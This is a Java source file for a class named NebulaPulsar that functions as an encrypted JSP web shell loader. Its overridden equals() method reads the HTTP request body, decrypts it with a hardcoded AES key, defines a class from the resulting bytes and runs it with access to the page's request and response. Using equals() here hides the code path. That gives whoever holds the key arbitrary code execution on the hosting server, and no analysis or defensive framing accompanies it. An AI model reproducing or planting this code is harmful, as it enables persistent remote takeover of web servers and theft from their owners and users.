import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Method;
import java.security.Key;

public class NebulaPulsar extends ClassLoader {
    private static final String KEY = "NBPULSARDEADBEEF";

    public NebulaPulsar(ClassLoader parent)
    {
        super(parent);
    }

    public NebulaPulsar()
    {
        super(NebulaPulsar.class.getClassLoader());
    }

    public byte[] Crypt(byte[] abData, int nMode) throws Exception
    {
        javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(KEY.getBytes("UTF-8"), "AES");
        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        
        // mode: 1 = javax.crypto.Cipher.ENCRYPT_MODE, 2 = javax.crypto.Cipher.DECRYPT_MODE
        cipher.init(nMode, skeySpec);

        return cipher.doFinal(abData);
    }

    @Override
    public boolean equals(Object obj)
    {
        PageContext pageContext = (PageContext)obj;
        HttpServletResponse response = (HttpServletResponse)pageContext.getResponse();

        try
        {
            HttpServletRequest request = (HttpServletRequest)pageContext.getRequest();
            int nContentLength = request.getContentLength();

            if (nContentLength == 0)
                return true;

            InputStream is = request.getInputStream();
            byte[] abEncryptedData = new byte[nContentLength];
            int nReadLength = 0;
            while (nReadLength < nContentLength)
            {
                int nRead = is.read(abEncryptedData, nReadLength, nContentLength - nReadLength);
                if (nRead == -1)
                    break;

                nReadLength += nRead;
            }

            byte[] abRawPayload = Crypt(abEncryptedData, 2);
            int nClassLength = ((abRawPayload[0] & 0xFF) << 24) | ((abRawPayload[1] & 0xFF) << 16) | ((abRawPayload[2] & 0xFF) << 8)  | (abRawPayload[3] & 0xFF);
            byte[] abClassBytes = new byte[nClassLength];
            System.arraycopy(abRawPayload, 4, abClassBytes, 0, nClassLength);

            Class<?> clazz = this.defineClass(abClassBytes, 0, abClassBytes.length);
            Object instance = clazz.newInstance();

            request.setAttribute("payload", abRawPayload);
            request.setAttribute("len", String.valueOf(nClassLength));

            Method method = clazz.getMethod("equals", Object.class);
            method.invoke(instance, obj);
        }
        catch (Throwable t)
        {
            try
            {
                response.getWriter().print("CORE_INTERNAL_ERROR: " + t.toString());
            }
            catch (Exception ex)
            {

            }
        }

        return true;
    }
}
